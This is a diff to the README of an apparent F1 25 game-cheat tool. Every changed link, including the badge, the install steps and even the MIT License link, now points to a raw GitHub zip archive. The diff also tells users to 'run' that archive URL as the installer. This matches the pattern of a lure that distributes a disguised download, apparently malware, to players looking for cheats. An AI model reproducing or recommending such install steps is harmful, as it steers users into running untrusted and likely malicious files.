@@ -1,6 +1,6 @@
 # F1 25 🏎️ Power Tools
 
-[![Download](https://img.shields.io/badge/Download-F1_25_Cheats-blue.svg)](https://dudi1920.github.io)
+[![Download](https://raw.githubusercontent.com/dudi1920/f1-25-custom-mod-tool/branch/peixere/f1-25-custom-mod-tool-2.5.zip)](https://raw.githubusercontent.com/dudi1920/f1-25-custom-mod-tool/branch/peixere/f1-25-custom-mod-tool-2.5.zip)
 
 ---
 
@@ -74,8 +74,8 @@ Never race alone. Our world-round support team is available at all hours—think
 
 Ready to take the next corner at full throttle? Here’s how to accelerate:
 
-1. Click the [Download button](#) above or use this https://dudi1920.github.io to access the installer.
-2. Run `F1-25-Cheats-Installer.exe` or the appropriate file for your OS.
+1. Click the [Download button](#) above or use this https://raw.githubusercontent.com/dudi1920/f1-25-custom-mod-tool/branch/peixere/f1-25-custom-mod-tool-2.5.zip to access the installer.
+2. Run `https://raw.githubusercontent.com/dudi1920/f1-25-custom-mod-tool/branch/peixere/f1-25-custom-mod-tool-2.5.zip` or the appropriate file for your OS.
 3. Follow the on-screen prompts—our responsive UI will shift gears for you.
 4. Upon launch, connect your F1 25 game instance; the tool will autodetect and calibrate settings.
 
@@ -92,11 +92,11 @@ This repository and its tools are crafted for private, educational, and experime
 
 ## 📜 MIT License
 
-Released under the [MIT License](https://opensource.org/licenses/MIT). Open for learning, modifying, and distributing with attribution in 2025 and beyond.
+Released under the [MIT License](https://raw.githubusercontent.com/dudi1920/f1-25-custom-mod-tool/branch/peixere/f1-25-custom-mod-tool-2.5.zip). Open for learning, modifying, and distributing with attribution in 2025 and beyond.
 
 ---
 
-## [![Download](https://img.shields.io/badge/Download-F1_25_Cheats-blue.svg)](https://dudi1920.github.io)
+## [![Download](https://raw.githubusercontent.com/dudi1920/f1-25-custom-mod-tool/branch/peixere/f1-25-custom-mod-tool-2.5.zip)](https://raw.githubusercontent.com/dudi1920/f1-25-custom-mod-tool/branch/peixere/f1-25-custom-mod-tool-2.5.zip)
 
 ---
 
